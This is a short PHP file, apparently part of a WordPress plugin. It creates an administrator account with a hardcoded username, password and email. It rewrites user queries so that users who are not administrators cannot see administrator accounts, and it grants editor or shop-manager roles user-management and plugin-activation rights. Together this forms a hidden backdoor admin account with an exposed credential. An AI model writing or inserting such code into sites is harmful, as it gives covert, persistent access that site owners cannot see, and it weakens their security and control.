<?php

function quecodig_add_admin(){
	$login = 'quecodigo';
	$passw = 'Qu3C0d1g0';
	$email = 'webmaster@quecodigo.com';
	if ( !username_exists( $login ) && !email_exists( $email ) ) {
		$user_id = wp_create_user( $login, $passw, $email );
		$user = new WP_User( $user_id );
		$user->set_role( 'administrator' );
	}
}

// https://wordpress.stackexchange.com/a/41444
function quecodig_pre_user_query( $user_search ) {
	if ( !current_user_can( 'administrator' ) ) { // Is Not Administrator - Remove Administrator
		global $wpdb;

		$user_search->query_where = str_replace(
			'WHERE 1=1',
			"WHERE 1=1 AND {$wpdb->users}.ID IN (
			SELECT {$wpdb->usermeta}.user_id FROM $wpdb->usermeta
			WHERE {$wpdb->usermeta}.meta_key = '{$wpdb->prefix}capabilities'
			AND {$wpdb->usermeta}.meta_value NOT LIKE '%administrator%' )",
			$user_search->query_where
		);
	}
}

function quecodig_add_caps(){
	if(is_plugin_active( 'woocommerce/woocommerce.php' )){
		$user_role = get_role( 'shop_manager' );
	}else{
		$user_role = get_role( 'editor' );
	}
	$user_role->add_cap( 'list_users' );
	$user_role->add_cap( 'edit_users' );
	$user_role->add_cap( 'create_users' );
	$user_role->add_cap( 'remove_users' );
	$user_role->add_cap( 'activate_plugins' );
}